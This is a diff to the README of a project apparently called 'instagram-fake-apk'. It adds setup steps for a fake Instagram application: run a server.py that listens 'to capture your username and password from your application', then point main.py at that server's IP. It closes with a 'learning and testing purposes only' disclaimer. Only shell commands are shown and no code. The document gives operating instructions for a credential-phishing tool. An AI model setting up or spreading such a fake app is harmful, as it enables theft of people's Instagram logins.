@@ -24,10 +24,16 @@ git clone https://github.com/alasgarovs/instagram-fake-apk.git
 pip install -r requirements.txt
 ```
 
-3. Run the application.
+3. Configure the IP address of the server in server.py and run it so the server will listen to capture your username and password from your application.
+```bash
+python server.py
+```
+
+4. Set ```flask_server_ip_last_octet``` in main.py to be the same as the last octet of the server IP and run main.py.
 ```bash
 python main.py
 ```
+
 ## Disclaimer
 
 This program is made for learning and testing purposes only. The developer is not responsible for any situations that may occur while using this application.
